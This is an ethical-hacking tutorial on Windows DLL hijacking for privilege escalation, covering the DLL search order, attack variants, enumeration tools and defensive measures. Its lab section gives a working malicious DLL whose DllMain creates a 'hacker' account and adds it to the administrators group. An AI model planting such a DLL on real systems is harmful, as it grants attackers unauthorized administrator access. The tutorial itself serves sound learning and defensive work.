# 1️⃣ What is DLL Hijacking?

**DLL Hijacking** happens when:

A privileged application tries to load a DLL
BUT
It loads a malicious DLL placed by an attacker instead of the legitimate one.

If the application runs as:

* SYSTEM
* Administrator
* Service account

Then your malicious DLL executes with those privileges.

---

# 2️⃣ How Windows Searches for DLLs (Critical Knowledge)

When an application loads a DLL **without a full path**, Windows searches in this order (simplified):

1. Application directory
2. System32
3. System
4. Windows directory
5. Current working directory
6. Directories in PATH

⚠️ If the program doesn’t specify the full path, it may load a malicious DLL placed earlier in the search order.

Example vulnerable code:

```c
LoadLibrary("example.dll");
```

Instead of:

```c
LoadLibrary("C:\\Windows\\System32\\example.dll");
```

---

# 3️⃣ Why DLL Hijacking Leads to Privilege Escalation

If:

* A service runs as SYSTEM
* It loads `missing.dll`
* It searches in a folder writable by Users
* You drop `missing.dll` there

Then your DLL executes as SYSTEM.

Boom → Privilege escalation.

---

# 4️⃣ Types of DLL Hijacking

### 🔹 1. DLL Search Order Hijacking

Most common. Exploits default search order.

---

### 🔹 2. Phantom DLL Hijacking

Application tries to load a DLL that doesn't exist.

You create it → it loads yours.

---

### 🔹 3. DLL Proxying

You:

* Rename original DLL
* Create malicious DLL with same name
* Forward legitimate calls to original DLL

Used to maintain functionality while executing payload.

---

### 🔹 4. Side-Loading

Common in signed applications.
App loads DLL from its own directory instead of System32.

Very common in real-world attacks.

---

# 5️⃣ How to Find DLL Hijacking Opportunities

## 🔍 Manual Enumeration

### Step 1: Identify privileged services

```cmd
sc query
```

or

```powershell
Get-Service
```

Check:

* Services running as SYSTEM
* Services pointing to custom executables

---

### Step 2: Check Loaded DLLs

Use tools:

* Process Monitor (ProcMon)
* Process Explorer
* ListDLLs
* WinPEAS

---

## 🔎 Using ProcMon (Very Effective)

Filter:

* Operation = `NAME NOT FOUND`
* Result = `NAME NOT FOUND`

If you see:

```
C:\Program Files\App\missing.dll → NAME NOT FOUND
```

That means:
The app is looking for a DLL that doesn't exist.

If that folder is writable → potential exploit.

---

## 🔎 Check Folder Permissions

```cmd
icacls "C:\Program Files\App"
```

If Users have:

* Write
* Modify
* Full Control

That’s dangerous.

---

# 6️⃣ Exploitation Concept (LAB ONLY ⚠️)

Scenario:

Service runs as SYSTEM.
Executable located at:

```
C:\Program Files\VulnApp\app.exe
```

ProcMon shows:

```
C:\Program Files\VulnApp\helper.dll → NAME NOT FOUND
```

And folder is writable.

---

### Create Malicious DLL (Concept)

Minimal DLL skeleton:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user hacker Pass123! /add");
        system("net localgroup administrators hacker /add");
    }
    return TRUE;
}
```

Compile as:

```
helper.dll
```

Place in vulnerable folder.

Restart service.

If vulnerable → your code runs as SYSTEM.

---

# 7️⃣ Tools That Help

### 🛠 WinPEAS

Automatically detects:

* Writable service folders
* Missing DLLs
* Privilege escalation vectors

---

### 🛠 PowerUp

```powershell
Invoke-AllChecks
```

---

### 🛠 SharpUp

C# version for Windows environments.

---

# 8️⃣ Defensive Measures (Blue Team Perspective)

As an ethical hacker, you must understand prevention:

✅ Always use full DLL paths in code
✅ Restrict write permissions on program folders
✅ Use SafeDllSearchMode
✅ Enable DLL signing
✅ Monitor unusual DLL loads
✅ Use AppLocker / WDAC

Check registry for SafeDllSearchMode:

```
HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode
```

Should be `1`.

---

# 9️⃣ Real-World Notes (Modern Windows)

Modern Windows mitigations:

* Safe DLL search mode (enabled by default)
* Protected directories (Program Files not writable)
* Defender monitoring suspicious DLL loads
* ASLR & DEP

Most real-world success comes from:

* Third-party software
* Misconfigured services
* Legacy applications

---

# 🔥 Practice Resources

Try:

* HackTheBox Windows machines
* TryHackMe – Windows PrivEsc room
* Build a lab:

  * Windows VM
  * Custom vulnerable service
  * Writable folder misconfiguration

---

# 🧠 Quick Comparison

| Technique      | Trigger Needed    | Common?     | Detection Difficulty |
| -------------- | ----------------- | ----------- | -------------------- |
| Scheduled Task | Wait for schedule | Very common | Medium               |
| DLL Hijacking  | Service restart   | Common      | Harder               |
| Unquoted Path  | Service restart   | Common      | Easy                 |
